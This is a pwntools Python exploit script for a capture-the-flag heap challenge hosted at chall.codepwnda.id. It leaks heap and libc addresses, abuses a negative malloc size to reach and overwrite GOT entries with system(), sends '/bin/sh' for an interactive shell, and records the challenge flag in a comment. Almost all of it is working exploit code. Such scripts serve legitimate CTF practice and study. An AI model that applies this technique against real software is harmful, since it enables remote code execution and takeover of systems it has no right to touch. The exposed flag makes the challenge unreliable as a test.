from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'chall'
elf = ELF(program,checksec=False)
lokal = False
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    libc = elf.libc
else:
    host = 'chall.codepwnda.id'
    port = '17012'
    xp = remote(host,port)
    # libc = elf.libc
    libc = ELF("libc-2.23.so",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = "b *0x080488ef \n c"
    gdb.attach(xp,cmd)

#Exploit Here
def create(nameSize, name, content):
   xp.sendlineafter("> ", '1')
   xp.sendlineafter(": ", str(nameSize))
   xp.sendafter(": ", name)
   xp.sendafter(": ", content)

def view(inx):
   xp.sendlineafter("> ", '2')
   xp.sendlineafter(": ", str(inx))
   xp.recvuntil("Name: ")
   n = xp.recvline()[:-1]
   xp.recvuntil("Content:\n")
   c = xp.recvline()[:-1]
   return n, c

def edit(inx, name, content):
   xp.sendlineafter("> ", '3')
   xp.sendlineafter(": ", str(inx))
   xp.sendafter(": ", name)
   xp.sendafter(": ", content)

def edit_username(username):
   xp.sendlineafter("> ", '5')
   xp.sendafter(": ", str(username))

def feedback(size, content):
   xp.sendlineafter("> ", '6')
   xp.sendlineafter(": ", str(size))
   xp.sendafter(": ", content)

xp.sendafter(": ", 'A'*20)

create(-1,"A"*(0x100-4)+"||||","B"*8)
leak =  view(0)[0].split("||||")[1]
leak = uu32(leak)
print hex(leak)

create(-1,"C"*0x108 + "\xff"*8,"DDDD")
leak += 0x220
print(hex(leak))
malloc_target = elf.got['read']-24
malloc_size = malloc_target - leak
print(malloc_size)

feedback(malloc_size, 'A') # malloc negative value

create(0xff,"FFF|","GGGG")
leakgot = view(2)[0].split("|")[1][:4]
leakgot = uu32(leakgot)
print hex(leakgot)

libc.address = leakgot - libc.symbols['malloc']
print hex(libc.address)

p = p32(libc.symbols["strcpy"])
p += p32(libc.symbols["malloc"])
p += p32(libc.symbols["puts"])
p += p32(libc.symbols["exit"])
p += p32(libc.symbols["strlen"])
p += p32(libc.symbols["system"])
p += p32(libc.symbols["system"])
p += p32(libc.symbols["system"])
p += p32(libc.symbols["system"])
p += p32(libc.symbols["system"])

edit(2,p,p)
sla("#> ","/bin/sh")

#hacktoday{may_the_force_be_with_you__43sdb}

xp.interactive()
